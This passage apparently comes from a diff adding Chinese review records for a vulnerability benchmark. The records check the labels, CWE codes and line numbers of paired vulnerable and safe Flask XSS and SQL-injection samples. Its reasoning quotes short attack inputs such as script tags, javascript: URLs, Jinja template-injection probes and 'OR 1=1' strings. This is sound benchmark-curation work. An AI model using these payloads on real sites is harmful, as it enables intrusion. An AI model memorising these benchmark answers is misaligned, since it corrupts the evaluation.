+lines=[20,20] 与 anchor 一致，标签、CWE 合理。附带业务缺陷：缺少 guests 键时 % 会 KeyError（500），
+这是输入校验问题，不影响 XSS 标签。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 20 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：缺失字段导致 500 属附带业务缺陷，建议单独记录，不建议改漏洞标签
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-20-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/xss.bundle.txt
+样例 SHA256：7a50faa126608bc3b90f03b758de69a8221c981d277b1f998b573ef33f465cde
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-20-V 的 POST /rsvp 表单字段 name、guests。
+输入经过的处理过程：第 21 行构造 {key: escape(request.form.get(key, "")) for key in (...)}，
+再对 % 模板做字典格式化。
+最终输出位置或危险操作：同一 <p> 文本节点，两个字段都已转义。
+已有防护及其适用范围：escape 覆盖模板用到的全部字段；未使用 safe/Markup。
+
+判断理由：格式化只拼接已经实体化的 Markup 文本，标签不会被执行。原标签 safe 成立。
+附带行为差异：缺失字段由 V 的 KeyError 变为空串，属业务语义变化，不是安全问题。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：安全对照把缺失字段默认成空串，修复时应确认这是否是期望业务
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+====================================================================
+二、开发集 XSS 源码（samples/dev/source/xss.bundle.txt，8 族 16 条）
+====================================================================
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-01-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：af035d080c12db3e05998fc769191908a747bb0a8cac92c0cfc973ded6815d6e
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 8-9 行（anchor 位于第 9 行）
+
+主审结论：agree
+
+输入来源：GET /greet 的查询参数 name。
+输入经过的处理过程：第 8 行 request.args.get("name","guest") 赋给局部变量，未做任何校验或转义。
+最终输出位置或危险操作：第 9 行 f-string 拼接进 "<h1>Hello, {name}!</h1>"，Flask 以 text/html 返回。
+已有防护及其适用范围：无。f-string 不触发自动转义；返回 str 也不做 HTML 转义。
+
+判断理由：name 中的 <script> 会原样进入 text/html 响应并执行，是最基础的反射型 XSS。
+label、CWE、lines=[8,9] 与真实数据流一致。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 8-9 行（sink 在第 9 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-01-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：a2c54c8c03e7bed49fa3989e29af112abeb70958af8661326b461f16b6233f7e
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-01-V 的 GET /greet 参数 name。
+输入经过的处理过程：第 9 行取 name，第 10 行 escape(name) 后放入 f-string。
+最终输出位置或危险操作：同一 <h1> 文本节点，参数已是实体文本。
+已有防护及其适用范围：markupsafe.escape 适用于 HTML 文本上下文；f-string 对 Markup 取字符串时
+保留的仍是已转义文本，不会二次反转义。
+
+判断理由：escape 把 <、>、&、引号编码，浏览器只显示文本；没有 |safe/Markup 恢复原始内容。
+原标签 safe 成立，业务文案不变。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-02-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：1fa10e94bb2ebec231ebe31c6dd26df0f193ab4ceb737aa47147a4705636ed03
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 9-10 行（anchor 位于第 9 行）
+
+主审结论：agree
+
+输入来源：POST /comment 的表单字段 body。
+输入经过的处理过程：request.form["body"] 直接与 "<div class='comment'>" 和 "</div>" 拼接为局部变量 html，中间无过滤。
+最终输出位置或危险操作：第 9 行生成的 HTML 在第 10 行返回（text/html）。
+已有防护及其适用范围：无。字符串拼接不改变内容。
+
+判断理由：body 中的 <img src=x onerror=...> 会进入 div 并执行，属反射型 XSS。
+lines=[9,10] 覆盖拼接与返回，anchor 在 9 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 9-10 行（sink 在第 9 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-02-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：8c008503b3ac3001f784c9abbe3a41a1a4021210e0deda8bc0a2c625e8510d6f
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-02-V 的 POST /comment 字段 body。
+输入经过的处理过程：第 10 行在赋值时先 html.escape(request.form["body"])，再拼接到 div。
+最终输出位置或危险操作：同一 div 文本节点，内容已实体编码。
+已有防护及其适用范围：html.escape 默认同时转义 & < > " '，适用于 HTML 文本与属性；
+它在数据进入拼接前生效，后续没有反转义。
+
+判断理由：转义发生在 source 处，拼接不会恢复标签；没有 |safe。原标签 safe 成立，演示了
+"在赋值处而不是 sink 处净化"同样有效。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-03-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：1351f03dd91b508de12150099f6437e23d04eef34e17045351c8220c5c17e8fd
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 9-10 行（anchor 位于第 10 行）
+
+主审结论：disagree（仅类别；标签与行号同意）
+
+输入来源：GET /preview 的查询参数 title。
+输入经过的处理过程：第 9 行把 title 直接拼进 Jinja 模板源：
+template = "<h2>" + title + "</h2><p>{{ note }}</p>"；第 10 行 render_template_string(template, note="draft")。
+最终输出位置或危险操作：第 10 行把"用户参与构造的模板源"交给 Jinja 编译渲染，结果作为 HTML 返回。
+已有防护及其适用范围：无。Jinja 自动转义只作用于模板变量，不作用于模板源；这里 title 进入了模板源。
+
+判断理由：title 同时具备两条攻击路径：(1) 直接写入 <script> 等标签形成反射型 XSS；
+(2) 写入 {{7*7}}、{{config}} 等表达式形成服务端模板注入（SSTI），可读取配置甚至执行代码。
+本样例的根因是模板源可控，精确类别应为 CWE-1336（Server-Side Template Injection），
+CWE-79 只是其后果之一；把 CWE 只标 79 会低估风险，也会让报告 CWE-1336 的检测结果被判错。
+标签 vulnerable 与 lines=[9,10]（拼接在 9、渲染在 10）本身正确，故只不同意 CWE。
+建议标签：保持 vulnerable
+建议 CWE：CWE-1336（主），同时保留 CWE-79 作为影响类别
+建议行号或 HTTP 位置：保持第 9-10 行（第 9 行为模板源拼接，第 10 行为渲染）
+证据文件：证据\03_源码关键片段.txt；问题清单 Q1
+待确认问题：项目评分若只认 CWE-79，需要组长决定是否接受 CWE-1336 或双标；见问题清单 Q1
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：CWE 归属需组长确认
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-03-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：5b210e2f059b59ae8652aaf4b3a4930ab44e4aa3acfafcdd12a12f8435942558
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-03-V 的 GET /preview 参数 title。
+输入经过的处理过程：模板改为模块级常量 PAGE = "<h2>{{ title }}</h2><p>{{ note }}</p>"；
+title 只作为 render_template_string 的上下文变量传入。
+最终输出位置或危险操作：同一 HTML 输出位置，但用户数据不再进入模板源。
+已有防护及其适用范围：常量模板 + Jinja 自动转义，同时消除了 SSTI 与 XSS；
+转义适用于 {{ title }} 所在的文本节点。
+
+判断理由：用户无法改变模板语法，只能作为变量值被自动转义；既不能执行 Jinja 表达式，也不能注入标签。
+原标签 safe 成立。若 V 的 CWE 调整为 CWE-1336，本族类别字段建议同步，以免族内不一致。
+建议标签：保持 safe
+建议 CWE：CWE-79（若族类别调整则同步为 CWE-1336）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：族 CWE 与 V 同步问题，见问题清单 Q1
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-04-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：f1a0d512fb6663098906fb6cc74f8a947c67cd62dd841dcb54af87ac71be218c
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 10 行（anchor 位于第 10 行）
+
+主审结论：agree
+
+输入来源：GET /badge 的查询参数 label。
+输入经过的处理过程：第 9 行取 label，第 10 行先做 Python % 拼接
+"<span class='badge'>%s</span>" % label（左侧是普通 str），再把整串交给 Markup()。
+最终输出位置或危险操作：第 10 行返回 Markup 对象，Flask 视为安全 HTML 直接输出。
+已有防护及其适用范围：无。Markup 的作用是"标记为安全"，在这里恰好把攻击者数据标记成安全；
+% 运算在 str 上完成，label 没有被 escape。
+
+判断理由：label 中的 <img onerror> 会原样进入 HTML 且被标记为安全，浏览器执行；这是 Markup 误用型 XSS。
+lines=[10,10]、anchor 一致，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 10 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-04-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：c628afd30e1084374f52b2ed6c53875e69e67f6857d435d52d49d058181f1aed
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-04-V 的 GET /badge 参数 label。
+输入经过的处理过程：第 10 行 Markup("<span class='badge'>{}</span>").format(label)。
+最终输出位置或危险操作：同一 span 文本位置。
+已有防护及其适用范围：Markup.format 对非 Markup 参数调用 escape；label 是普通 str，因此被转义；
+适用于 HTML 文本/属性值。
+
+判断理由：先构造安全模板再格式化，格式参数被转义；若 label 本身是 Markup 才会跳过转义，
+但它是 request.args 返回的 str。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-05-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：ed938b6d217acff0358922c3c1ba9544d6877b86421191164681a147a7f6422e
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 9-10 行（anchor 位于第 10 行）
+
+主审结论：agree
+
+输入来源：GET /search 的查询参数 q。
+输入经过的处理过程：第 9 行 body = "<p>No results for %s</p>" % query，未转义；
+第 10 行 make_response(body)，第 11 行显式设置 Content-Type: text/html; charset=utf-8。
+最终输出位置或危险操作：第 10-12 行返回的 HTTP 响应体，明确按 HTML 渲染。
+已有防护及其适用范围：无。% 格式化不转义；显式 text/html 使浏览器一定按 HTML 解析。
+
+判断理由：q 中的标签进入响应体并执行；显式设置 text/html 排除了"内容类型不当导致不执行"的侥幸。
+lines=[9,10] 覆盖构造与响应对象，anchor 在 10 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 9-10 行（sink 在第 9 行，响应在第 10 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-05-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：0e1a14e68abe1af2927703261c8197b9a79f6d2e5e4db376497648d9d10f0c21
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-05-V 的 GET /search 参数 q。
+输入经过的处理过程：第 10 行 body = "<p>No results for %s</p>" % escape(query)，再 make_response。
+最终输出位置或危险操作：同一 text/html 响应体，参数已实体化。
+已有防护及其适用范围：escape 适用于 HTML 文本节点；显式 text/html 不改变转义效果。
+
+判断理由：转义后的文本不会被执行；Markup 的 __str__ 输出仍是实体文本。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-06-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：4ca061b842ec2affdf3887636fb365f4ebaae56cdcdb97c5670e828f064043d2
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 8-9 行（anchor 位于第 9 行）
+
+主审结论：agree
+
+输入来源：GET /profile 的查询参数 site。
+输入经过的处理过程：第 8 行取 site，第 9 行直接拼进双引号 href：
+'<a href="' + site + '">Website</a>'。
+最终输出位置或危险操作：第 9 行返回的 <a href="..."> 属性值（HTML 属性上下文）。
+已有防护及其适用范围：无。没有 URL 方案校验，也没有属性值转义。
+
+判断理由：两条可利用路径：(1) site = javascript:alert(1) 形成 javascript: URL；
+(2) site 含双引号可闭合 href 并注入 onmouseover 等事件属性。均为 XSS。原标签 vulnerable、
+CWE-79、lines=[8,9] 与数据流一致。注意这是属性上下文，单纯 HTML 文本转义不足以防 javascript:。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 8-9 行（sink 在第 9 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-06-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：595d45db2098225b61fc339bd33b96f933a0c6ea1f51d38f273761876a5194f1
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-06-V 的 GET /profile 参数 site。
+输入经过的处理过程：第 12 行 urlparse(site).scheme 必须属于 {http, https}，否则 abort(400)；
+第 14 行再用 escape(site) 拼进双引号 href。
+最终输出位置或危险操作：同一 href 属性。
+已有防护及其适用范围：方案白名单阻止 javascript:/data: 等可执行 URL；escape 负责属性值边界
+（双引号被编码为 &#34;），两者分别覆盖 URL 语义与 HTML 语法，缺一不可。
+
+判断理由：urlparse 会规范化 scheme（小写、去掉前导空白/控制字符），javascript: 无法通过；
+即使通过 http(s)，引号也被转义，不能闭合属性。因此该位置无 XSS。原标签 safe 成立，
+且业务上只拒绝非 http(s) 的链接，属合理收紧。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：http(s) 外链仍可指向外部站点（开放跳转类风险），但不属于 XSS，不影响本标签
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-07-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：6569f049c8f492eb9672d794ea370799793bd02919a911a9ea46ae3f90cf40fb
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 6-13 行（anchor 位于第 7 行）
+
+主审结论：agree
+
+输入来源：GET /table 的重复查询参数 v（request.args.getlist("v")）。
+输入经过的处理过程：值列表传入 render_row(cells)；helper 内用生成器 f"<td>{cell}</td>" 拼接，
+再 join 成 <tr>；视图包上 <table> 后返回。
+最终输出位置或危险操作：第 7 行 helper 中的 <td> 单元格拼接（数据流源头在第 12 行 getlist）。
+已有防护及其适用范围：无。helper 内没有任何转义，跨函数调用不改变内容。
+
+判断理由：任一 v 值中的标签会进入单元格并执行；这是跨过程（helper + 生成器）的反射型 XSS。
+manifest 用 [6,13] 覆盖 helper 定义到视图返回，anchor 在 7 行，定位合理；核心 sink 是第 7 行。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 6-13 行（核心 sink 在第 7 行，来源在第 12 行）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-07-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：751ba799a0de3302cae0bb92cdc764fd8363e72119e607028facd6a8af72afcc
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-07-V 的 GET /table 重复参数 v。
+输入经过的处理过程：helper 内对每个 cell 调用 escape(cell) 再拼 <td>；视图不变。
+最终输出位置或危险操作：同一单元格 HTML 文本位置。
+已有防护及其适用范围：转义放在 helper 的每个元素上，覆盖 getlist 的所有值；
+调用方不再二次拼接原始数据。
+
+判断理由：所有进入表格的值都被转义，生成器/join 不会反转义；无遗漏分支。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-08-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：c1568c868ce1e66899d40fc9b6e85619f4c14d24e19485fe97b891b9835cddf6
+原标签：vulnerable
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：第 12 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：数据库 notes 表的 title、body（数据库中已存储的数据，属于存储型来源）。
+输入经过的处理过程：第 11 行用参数绑定取出 row（note_id 为 <int:>，SQL 使用 ?，此处无 SQL 注入），
+第 12 行 "%s" % (row[0], row[1]) 直接拼成 <article> HTML。
+最终输出位置或危险操作：第 12 行返回的 HTML。
+已有防护及其适用范围：无。SQL 绑定只保护查询，不保护 HTML 输出；数据库取出的文本同样不可信。
+
+判断理由：若 notes 内容可由用户写入（存储型 XSS 的常规前提），标题/正文中的标签会在展示页执行。
+原标签 vulnerable、CWE-79、lines=[12,12] 与 sink 一致。样例内没有展示写入路径，
+但"存储数据在输出端未编码"本身即是缺陷。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持第 12 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：写入路径未在样例中给出；若业务保证 notes 完全由管理员可信录入，可利用性下降，
+但按存储型 XSS 设计仍应判 vulnerable（见问题清单说明，不单列分歧）
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-XSS-08-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/xss.bundle.txt
+样例 SHA256：1bfe7bb7ab6a2fbba1f281319ad3eb0f715d5a51f6371cfe12cd8d87a28aea7b
+原标签：safe
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-XSS-08-V 的 notes 表 title、body。
+输入经过的处理过程：第 13 行 render_template_string(NOTE, title=row[0], body=row[1])，
+NOTE 是常量模板 "{{ title }}/{{ body }}"。
+最终输出位置或危险操作：同一 <article> 输出位置，改为模板变量渲染。
+已有防护及其适用范围：Jinja 自动转义对两个文本节点生效；模板常量不含用户可写语法。
+
+判断理由：数据库中的标签作为变量值被转义，不会执行；同时不存在 SSTI。原标签 safe 成立，
+且与 V 的业务输出一致（标题/正文仍显示）。
+建议标签：保持 safe
+建议 CWE：保持 CWE-79（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+====================================================================
+三、原保留集 SQL 注入源码（samples/holdout/source/sqli.bundle.txt，12 族 24 条）
+====================================================================
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-09-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：529df0959507f3334006adbe95564aa7625543256521c4ee899871791f796514
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12-13 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：GET /compare 的重复查询参数 id（request.args.getlist("id")）。
+输入经过的处理过程：第 12 行把 ids 用 ",".join 拼进 SQL 的 IN (...) 列表，字符串本身由用户值组成；
+第 13 行 db.execute(sql) 直接执行。
+最终输出位置或危险操作：第 13 行 sqlite3 execute，SQL 结构受用户输入控制。
+已有防护及其适用范围：无。join 只是字符串拼接，不是参数绑定。
+
+判断理由：ids 中的 "0) OR 1=1 --" 会闭合 IN 列表并把 WHERE 变成恒真，返回全部行；
+多个 id 也可注入子查询。属典型 IN 列表拼接注入。lines=[12,13]、anchor 在 12 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12-13 行（拼接在 12，执行在 13）
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-09-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：4be52e62ab98dd91c5834cb689fce076ad515445ddb3984dd331f9435670b485
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-09-V 的 GET /compare 重复参数 id。
+输入经过的处理过程：第 12 行按 ids 的个数生成 "?" 占位符串，再拼进 SQL；第 14 行把 ids 作为参数元组
+传给 execute。
+最终输出位置或危险操作：同一 IN 查询，但 SQL 文本只含固定占位符。
+已有防护及其适用范围：qmark 参数绑定；占位符个数来自列表长度而非用户文本，SQL 结构不可改变。
+
+判断理由：用户值只作为绑定参数，即使含引号/括号也只被当成数据；这是本场景的正确修法。
+原标签 safe 成立。附注：ids 为空时 SQL 会变成 "IN ()" 导致 SQLite 语法错误（500），属边界业务缺陷，
+不是注入，也不改变 safe 标签。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：空列表边界建议单独记录为业务缺陷
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-10-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：ec60904319f8d4c2bf96171564c582dc3ab5df9b472dc953820ad75123d896ee
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：路由变量 /invoice/<invoice_id>（字符串转换器）。
+输入经过的处理过程：invoice_id 未做类型转换，直接拼进未加引号的数值上下文：
+"SELECT total, status FROM invoices WHERE id = " + invoice_id。
+最终输出位置或危险操作：第 11 行 db.execute(...).fetchone()。
+已有防护及其适用范围：无。字符串路由变量可含空格、运算符和 SQL 片段。
+
+判断理由：invoice_id = "0 OR 1=1" 会变成 WHERE id = 0 OR 1=1，返回首行；也可用 UNION 等。
+数值上下文没有引号并不等于安全，必须做类型校验或绑定。lines=[11,11]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 11 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-10-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：7f9e5d7711b09bff410842dca0fb831e49a1c10e5ba99bf1f86da3ea8b0225cf
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-10-V 的 /invoice/<invoice_id>。
+输入经过的处理过程：第 11 行先 int(invoice_id)，再 str() 拼入 SQL。
+最终输出位置或危险操作：同一数值上下文查询。
+已有防护及其适用范围：int() 做严格十进制解析，非数字抛 ValueError（500），不会把任意 SQL 文本带回查询；
+数值再转字符串只含数字和符号，不能改变语句结构。
+
+判断理由：无论输入含引号、空格还是 OR，int() 都会拒绝；能通过的值只能是整数。原标签 safe 成立。
+注意非法输入的返回码是 500（未捕获异常），属错误处理问题，不影响注入判定。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-11-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：1bb14102f50a5cea3e86df25dda2b8d18f6d5d405f8c4f99d15dac63a87d0d9f
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：路由变量 /export/<table>。
+输入经过的处理过程：table 直接 f-string 进 FROM 子句："SELECT * FROM {table} LIMIT 100"。
+最终输出位置或危险操作：第 11 行 db.execute(...)。
+已有防护及其适用范围：无。表名是 SQL 标识符，不能用参数绑定占位符替代，只能白名单/引号校验。
+
+判断理由：table 可写成 "sales UNION SELECT ..."、"sqlite_master" 等，读取任意表或拼接结果集；
+标识符注入同样是 SQL 注入。lines=[11,11]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 11 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-11-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/sqli.bundle.txt
+样例 SHA256：b712485839fc5a76fb5002216a327c50584517fb3c7b6ecf5a53566906f06e60
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
